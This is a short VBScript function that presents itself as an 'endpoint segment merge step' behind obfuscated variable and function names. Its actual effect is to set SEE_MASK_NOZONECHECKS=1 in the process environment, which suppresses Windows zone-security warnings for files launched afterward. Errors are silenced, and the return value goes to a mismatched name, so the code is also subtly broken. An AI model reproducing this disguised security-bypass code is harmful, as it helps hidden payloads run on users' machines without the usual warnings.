' --- Endpoint segment merge step ---
Function ResolveConfigCipher16()
On Error Resume Next
  Dim strManifestRaw45,strKey759,strKey91
  Set strManifestRaw45=CreateObject("WScript.Shell")
  strKey759=strManifestRaw45.ExpandEnvironmentStrings("%TEMP%")
  strKey91=strManifestRaw45.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strKey759)>0 And Len(strKey91)>0 Then
    strManifestRaw45.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    MergeProfileDelta17=1
    Exit Function
  End If
  MergeProfileDelta17=0
End Function

